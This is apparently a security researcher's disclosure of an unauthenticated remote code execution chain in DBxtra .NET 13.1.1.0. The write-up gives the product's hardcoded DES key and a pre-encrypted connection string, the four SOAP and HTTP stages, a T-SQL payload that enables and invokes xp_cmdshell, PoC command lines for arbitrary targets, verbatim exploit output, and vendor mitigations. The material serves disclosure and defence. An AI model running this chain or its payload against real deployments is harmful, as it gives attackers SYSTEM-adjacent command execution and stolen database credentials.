# DBxtra .NET 13.1.1.0 — Unauthenticated SOAP xp_cmdshell RCE

## 1. Overview

DBxtra .NET (vendor: DBxtra Software / Advisionario S.A. de C.V., Mexico) is a closed-source, self-hosted BI and reporting tool for Windows. Its Report Web Service ships as `DBxtraWebService.exe`, a Windows service that runs as `NT AUTHORITY\SYSTEM` (LocalSystem) and self-hosts a legacy Cassini HTTP server (`Microsoft.VisualStudio.WebHost.Server`, .NET Framework 4.8). On the default port (8765) it publishes `DBxtraService.asmx` — a classic ASMX SOAP web service exposing 346 `[WebMethod]` operations — together with a set of .aspx report-viewer pages. Product metadata (projects, connections, report objects) is stored in an Access .mdb file guarded only by a password hardcoded in the product. The product has no previously published CVE entries.

Although `web.config` declares `authentication mode="Windows"`, the ASMX service class carries no class-level authentication attribute or filter, so all 346 SOAP operations are anonymously callable. An unauthenticated attacker chains three SOAP operations with one plain HTTP GET to turn the product into an arbitrary command execution engine:

1. `ProjectConnectionInsertDB` — registers an arbitrary backend data source (SSRF primitive; `Integrated Security=SSPI` makes the LocalSystem web service connect to the co-hosted SQL Server instance as sysadmin)
2. `ProjectObjectInsertDB` — stores an attacker-authored SQL report object that enables and invokes `xp_cmdshell`, flagged `AnonymousAccess=true`
3. `UpdateDatabaseVersion` — rewrites the metadata database version to satisfy the report viewer's version gate
4. `GET /DataGrid.aspx?Id=<ObjectId>` — the viewer executes the stored SQL server-side, reaching `xp_cmdshell` and arbitrary OS command execution

The chain was verified end-to-end against a default installation (v13.1.1.0, latest release at research time): a single unauthenticated script run produced a marker file on the target whose content (`nt service\mssql$sqlexpress` + `RCE_OK`) proves command execution as the SQL Server service account. The research followed the full path — surface discovery (346 anonymous SOAP operations), sink localization (server-side SQL execution in the report viewer), source identification (unauthenticated connection/SQL object/version writes), chain construction, then dynamic verification.

## 2. Vulnerability Summary

- **Type**: Unauthenticated remote code execution via unauthenticated SOAP API → arbitrary datasource registration (SSRF) → attacker-authored SQL object → xp_cmdshell (CWE-306 / CWE-918 / CWE-78)
- **Root cause 1 (CWE-306, Missing Authentication for Critical Function)**: the `Service` ASMX class has no class-level authentication; all 346 `[WebMethod]` operations — including datasource registration, SQL-object creation, and the database-version rewrite — are anonymously callable
- **Root cause 2 (CWE-918, Server-Side Request Forgery)**: `ProjectConnectionInsertDB` persists an arbitrary attacker-supplied connection string that the web service later opens; the service runs as LocalSystem, so `Integrated Security=SSPI` datasources authenticate to database servers as a privileged machine identity
- **Root cause 3 (CWE-78, OS Command Injection)**: `ProjectObjectInsertDB` persists attacker-authored SQL that the report viewer executes verbatim through `SqlCommand`/`SqlDataAdapter`; SQL that enables and calls `xp_cmdshell` yields arbitrary OS command execution
- **Enabling weakness**: connection strings are "protected" at rest by DES-CBC with the hardcoded key/IV `3n73lix*`, so any desired connection string can be pre-encrypted offline before submission
- **Result**: unauthenticated arbitrary command execution on the DBxtra host as the SQL Server service account (high integrity, sysadmin of the instance); the web service component itself runs as LocalSystem. CVSS 9.8.

## 3. Attack Surface & Authentication Boundary

**Entry points** (all plain HTTP, no handshake or session bootstrap required):

- `POST /DBxtraService.asmx` — SOAP envelope with `SOAPAction: "http://tempuri.org/<Method>"`; 346 exposed `[WebMethod]` operations
- `GET /DataGrid.aspx?Id=<ObjectId>` (and sibling viewer pages such as `ObjectView.aspx`, `Report_View.aspx`) — report rendering pages that execute the stored object's SQL server-side

**Authentication boundary: none.** The ASMX `Service` class derives from `WebService` with no authorization attribute, no SOAP-header credential requirement, and no authentication filter anywhere in the request pipeline. `web.config` declares `authentication mode="Windows"`, but nothing enforces a principal on ASMX requests: anonymous callers receive normal SOAP responses (HTTP 200), never 401/403. Effectively the product's entire management API is the attack surface.

Dynamic boundary check: an anonymous SOAP call to `GetDBxtraWebServiceVersion` returned `"13.1.1"` with HTTP 200 — no challenge, no credentials, no 401/403. This confirmed the boundary before any chain construction.

**Prerequisite for the full chain**: the DBxtra web service account (LocalSystem by default) must be able to reach a SQL Server instance on which it authenticates as sysadmin. This is the common small-business BI deployment shape — DBxtra installed on the same host as SQL Server Express — where LocalSystem is sysadmin on the instance by default. The verified lab used exactly this default co-hosted shape (`localhost\SQLEXPRESS`, service account `NT Service\MSSQL$SQLEXPRESS`).

**Transport nuance**: the default Cassini listener binds to loopback only (localhost:8765). The verified run executed the PoC on the target host itself. In deployments where the service is bound to all interfaces or published through a reverse proxy, the identical chain is remotely reachable over the network (network attack vector). Even in loopback-only installs, any local low-privilege account can trigger the chain — a local privilege-escalation path into a high-integrity service account.

## 4. Root-Cause Analysis

### 4.1 No class-level authentication (surface discovery)

Decompiled web-server source:

```csharp
// DBxtraWebServer/Service.cs:16 — no authentication attribute, no auth filter
public class Service : WebService
{
    [WebMethod]
    public int ProjectConnectionInsertDB(...) { ... }
    [WebMethod]
    public int ProjectObjectInsertDB(...) { ... }
    [WebMethod]
    public bool UpdateDatabaseVersion(string Values) { ... }
    // ... 346 [WebMethod] operations in total, all anonymously callable
}
```

### 4.2 Source A — ProjectConnectionInsertDB: arbitrary datasource registration (Service.cs:1572)

The method accepts a fully attacker-controlled `sConnString` (plus server/database/user fields) and persists it into the metadata database's `ProjectConnection` table. Connection strings are encrypted at rest — under a hardcoded DES key — and decrypted on read:

```csharp
// ProjectConnectionClass.cs:329
public string ConnectionString {
    get {
        string plainText = Conversions.ToString(
            Operators.ConcatenateObject("", ConnectionData["ConnectionString"]));
        plainText = SecurityInfo.Decrypt(plainText);   // decrypt on read
        return plainText;
    }
    set { ConnectionData["ConnectionString"] = SecurityInfo.Encrypt(value); }   // encrypt on write
}
```

`SecurityInfo.Encrypt` (SecurityInfo.cs) is DES-CBC with key = IV = the ASCII bytes of `3n73lix*`, plaintext encoded UTF-16LE with a trailing CR-LF, PKCS7 padding, Base64 output. Because the key is hardcoded and identical in every copy of the product, the attacker pre-computes the ciphertext of any desired connection string offline and submits it directly.

### 4.3 Source B — ProjectObjectInsertDB: attacker-authored SQL (Service.cs:1626)

The method accepts attacker-controlled `sSQL`, `nCnnId`, `bAnonymousAccess` (and layout metadata) and persists the record into the metadata database's `ProjectObject` table. There is no authentication and no validation of the SQL text: stored report objects can contain any T-SQL batch, including `sp_configure` reconfiguration and `xp_cmdshell` invocation, and can be flagged for anonymous execution.

### 4.4 UpdateDatabaseVersion: unauthenticated metadata version rewrite (Service.cs:2741)

A maintenance operation that rewrites the metadata database's stored version — anonymously callable in the same unauthenticated surface.

### 4.5 Sink — DataGrid.aspx server-side SQL execution (sink localization)

The report viewer code-behind `DataGridN.cs` executes the resolved object's SQL during page load:

```csharp
// DataGridN.cs:1522 (Page_Load, after LoadEmbedded resolves the object)
object objectValue = RuntimeHelpers.GetObjectValue(
    objClass.GetDataAdapter(bGetParams:true, bADODB:false, NoParameters:false,
                            bConfigScheduleParams:false, ref GlobalParameters));
// DataGridN.cs:1542
NewLateBinding.LateCall(instance, null, "fill", array, ...);   // SqlDataAdapter.Fill -> SQL executes
```

`GetDataAdapter` builds the ADO.NET objects from the stored object's SQL and connection:

```csharp
// ProjectObjectClass.cs:2397 (GetDataAdapter)
SQLServer -> new SqlConnection(ConnectionData.ConnectionString) +
             new SqlCommand(strSQL, ...) + new SqlDataAdapter(...)
```

The sink is `SqlCommand` executing fully attacker-controlled SQL: if that SQL contains `xp_cmdshell` (after enabling it through `sp_configure`), this is OS command execution.

### 4.6 Version gate — AllowAccessWebReport, and its unauthenticated fix

The report viewer gates object execution on the metadata database version:

```csharp
// CommonFunctions.cs (AllowAccessWebReport)
int Version = Conversions.ToInteger(DBxtraWebService.GetDatabaseVersion());
if (13110L != Version)   // metadata DB version must equal 13110 (13.1.1)
{
    Msg.Text = "The DBxtra Server database is version " + ... + ". Please update...";
    // result stays false -> the anonymous branch returns early
}
```

When `AllowAccessWebReport` returns false, the anonymous branch (`if (Session["UserLogID"]==0) return;`) exits before `Fill` runs — the page renders "No data to display" and no SQL executes. The unauthenticated `UpdateDatabaseVersion` SOAP method rewrites the stored version to 13110, satisfying the gate and unlocking the anonymous report-execution path.

## 5. Exploit Chain Construction

### 5.1 Stage 1 — pre-encrypt and register the SSPI datasource

Offline (attacker-side), encrypt the target connection string with the known DES parameters:

- plaintext: `Server=localhost\SQLEXPRESS;Integrated Security=SSPI;Database=master;Timeout=30`
- DES-CBC, key = IV = `3n73lix*`, UTF-16LE + CRLF, PKCS7, Base64 — yielding this 224-character ciphertext:

```
grmbvjOnZoFVz5qzbT7VmmDGDNwBoXyT8ieC0deWd5zomlcV4T/cJwXoxi2MmjyB
h+7OoI2zps0vmkjX9umHNUQH8Rz6iP33NfBxiHUp/qbEZD/KZrsOrs3RxYfLOSFX
UeKRnoYTz50Fnwkmi/xU1LYI6KU4kqh6DTRIgvC1/HomDspsu9IIPruFTSE6AkJU
6q+lEhDiJnUlKlargAHKQWFBWa9s7Nu9
```

Then call `ProjectConnectionInsertDB(sConnString=<ciphertext>, sServer=localhost\SQLEXPRESS, sDataBase=master, bWin=true, ...)`. The stored datasource makes the web service — running as LocalSystem — open an `Integrated Security=SSPI` connection to the SQL Server instance, authenticating as a sysadmin-level identity (SSRF to the internal database server with the service's own privileges).

### 5.2 Stage 2 — store the xp_cmdshell report object

`ProjectObjectInsertDB(sSQL=<payload>, nCnnId=<CnnId from stage 1>, bAnonymousAccess=true)` stores:

```sql
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
EXEC xp_cmdshell '<attacker command>'
```

Flagged for anonymous access, the object renders without any session.

### 5.3 Stage 3 — satisfy the version gate

`UpdateDatabaseVersion(Values="13110")` rewrites the metadata database version; `AllowAccessWebReport` now passes and the viewer's anonymous branch proceeds to execution.

### 5.4 Stage 4 — trigger execution

`GET /DataGrid.aspx?Id=<ObjectId>` resolves the object, builds `SqlConnection/SqlCommand/SqlDataAdapter` from the stored record, and `Fill` executes the batch: advanced options are flipped on, `xp_cmdshell` spawns the attacker's command, and output lands on the host filesystem.

### 5.5 End-to-end data flow

```
unauthenticated attacker
  |
  +-[SOAP] ProjectConnectionInsertDB(sConnString=pre-encrypted "Server=localhost\SQLEXPRESS;Integrated Security=SSPI;...")
  |        -> metadata DB, ProjectConnection row (CnnId=N)
  |
  +-[SOAP] ProjectObjectInsertDB(sSQL="EXEC xp_cmdshell '...'", nCnnId=N, bAnonymousAccess=true)
  |        -> metadata DB, ProjectObject row (ObjectId=M)
  |
  +-[SOAP] UpdateDatabaseVersion("13110")   <- fixes the version gate
  |
  +-[HTTP GET] /DataGrid.aspx?Id=M
           -> DataGridN.LoadEmbedded -> new ProjectObjectClass(M)
           -> ProjectObjectClass.Load -> GetObjectInformationById -> reads back SQL + connection
           -> GetDataAdapter(SQL) -> new SqlConnection(ConnectionString) [SSPI = LocalSystem]
           -> SqlCommand(strSQL) + SqlDataAdapter.Fill
           -> SQLEXPRESS executes "EXEC xp_cmdshell 'whoami > proof.txt'"
           -> xp_cmdshell runs as the SQL Server service account -> RCE
```

## 6. PoC Usage

The proof-of-concept (`exploit/dbxtra_soap_xpcmdshell_rce.py`, pure Python 3 standard library — urllib/re/random/string, no third-party dependencies) performs the full chain:

```sh
# default target http://127.0.0.1:8765, default marker command
python3 exploit/dbxtra_soap_xpcmdshell_rce.py

# custom target and command
python3 exploit/dbxtra_soap_xpcmdshell_rce.py http://<host>:8765 "whoami > C:\\Windows\\Temp\\p.txt"
```

Steps executed: GetProjects (resolve ProjectId) → ProjectConnectionInsertDB (register the SSPI datasource) → GetProjectConnectionsOf (resolve the new CnnId) → ProjectObjectInsertDB (store the xp_cmdshell object) → ObjectId resolution (directly from insert return, else GetObjectByName fallback) → UpdateDatabaseVersion (fix the gate) → GET viewer pages to trigger execution. Object and connection names carry a random suffix so repeated runs never collide.

The default command writes a two-line marker to `C:\Windows\Temp\dbxtra_rce_proof.txt`; on the target host, `type C:\Windows\Temp\dbxtra_rce_proof.txt` prints the execution identity and `RCE_OK`. The verified run was executed on the host itself against `http://localhost:8765` (loopback-only default listener); the same script runs unchanged against any remotely exposed deployment.

## 7. Verification Evidence

Environment: Windows Server 2025 host, default DBxtra .NET v13.1.1.0 Report Web Service (`DBxtraWebService.exe` as LocalSystem, Cassini on localhost:8765), co-hosted `localhost\SQLEXPRESS` instance (SQL Server service account `NT Service\MSSQL$SQLEXPRESS`). PoC stdout (verbatim, no credentials used anywhere):

```
[*] target = http://localhost:8765
[*] SOAP endpoint = http://localhost:8765/DBxtraService.asmx

[*] Step 1: GetProjects
[+] ProjectId = 56
[*] Step 2: ProjectConnectionInsertDB (register localhost\SQLEXPRESS, SSPI)
[+] return = 1 (1=success)
[*] Step 3: GetProjectConnectionsOf(56) -> find new CnnId
[+] CnnId = 60 (highest = most recent)
[*] Step 4: ProjectObjectInsertDB (xp_cmdshell SQL, AnonymousAccess=true)
[+] return = 1411 (>1 = new ObjectId, 1 = success)
[+] ObjectId = 1411 (from insert return)
[*] Step 6: UpdateDatabaseVersion('13110') (fix version gate)
[+] return = 1 (1=success)
[*] Step 7: GET /DataGrid.aspx?Id=1411 (trigger xp_cmdshell)
    /DataGrid.aspx?Id=1411 -> HTTP 200
    /ObjectView.aspx?ID=1411 -> HTTP 200
    /Report_View.aspx?ID=1411 -> HTTP 200
    /DataGrid.aspx?Id=1411&BM=True -> HTTP 200

[+] Chain complete. RCE triggered.
```

Every SOAP call returned HTTP 200 with `<{Method}Result>` integer payloads (1 = success, >1 = new row ID), and every viewer GET returned HTTP 200 (the report page rendered; `Fill` executed server-side).

Target-side proof file, freshly created by the run and verified immediately after:

```
=== PROOF FILE EXISTS ===
Length=38 LastWrite=08/03/2026 03:02:26
=== CONTENTS ===
nt service\mssql$sqlexpress
RCE_OK
```

- `nt service\mssql$sqlexpress` — output of `whoami` under `xp_cmdshell`: the command executed as the SQL Server service account
- `RCE_OK` — output of the injected `echo RCE_OK`: confirms attacker-controlled command construction, not a fixed built-in probe
- the file's creation timestamp postdates the trigger request — the marker was produced by the unauthenticated HTTP requests, not by pre-existing state

Research-process note: the first PoC iteration failed at object resolution — `GetObjectByName` could not find the object because `ProjectObjectInsertDB` directly returns the new ObjectId (>1) rather than a bare success code, and repeated runs collided on the object name. The final PoC stores the insert's return value as the ObjectId and randomizes object/connection names per run; after those two fixes the chain passed end-to-end on the first attempt.

## 8. Security Impact

- **Execution context**: the injected command runs as `NT Service\MSSQL$SQLEXPRESS` — the SQL Server service account, High mandatory integrity, sysadmin on the instance, with arbitrary read/write access to every database hosted there. On the default co-hosted deployment this is the machine's primary data store. The web service component itself runs as LocalSystem.
- **Privileged pivot surface**: the datasource-registration primitive (SSRF) originates from a LocalSystem process. It can be pointed at any intranet host accepting Windows integrated authentication, generating privileged authenticated connections from the DBxtra host at the attacker's will; it also serves as a blind internal probing primitive.
- **Data exposure**: the metadata store holds every registered BI datasource's connection string, all decryptable at will with the product's hardcoded DES key. Reading the metadata database (trivial once command execution exists) yields credentials for every backend database the BI server touches.
- **Integrity and availability**: full command execution on the host permits service disruption, staged destruction, log tampering, and persistence; there is no sandbox, output restriction, or capability control anywhere in the path.
- **Blast radius**: default installations — no configuration change, no credentials, no user interaction; a single unauthenticated script run.

## 9. Mitigation

Vendor-side (code):

1. **Enforce authentication on the SOAP API**: apply an authentication filter/attribute to the `Service` class and require an authenticated principal in every `[WebMethod]` — anonymous callers must not reach object-management operations
2. **Whitelist datasource registration**: `ProjectConnectionInsertDB` must restrict registrable servers (deny loopback and intranet targets), reject `Integrated Security=SSPI` datasources from anonymous callers, and require administrative approval for new datasources
3. **Authenticate and validate SQL object writes**: `ProjectObjectInsertDB` must require authentication, and stored SQL must be validated (reject extended stored procedures such as `xp_cmdshell` and unrestricted ad-hoc batches from untrusted sources)
4. **Gate UpdateDatabaseVersion**: the metadata-version rewrite must require administrator authentication; it must never be anonymously callable
5. **Least privilege on the SQL side**: disable `xp_cmdshell` (or run the SQL instance under a non-sysadmin account) so executed SQL cannot reach the operating system
6. **Stop running the web service as LocalSystem**: use a dedicated low-privilege service account so SSPI datasources cannot authenticate as a machine-level privileged identity

Deployment-side (interim, until a vendor patch):

- Keep the service listener on loopback; never publish port 8765 through a reverse proxy or firewall rule without an authenticated front
- Where operationally possible, run the co-hosted SQL Server instance under a reduced-privilege account with `xp_cmdshell` disabled
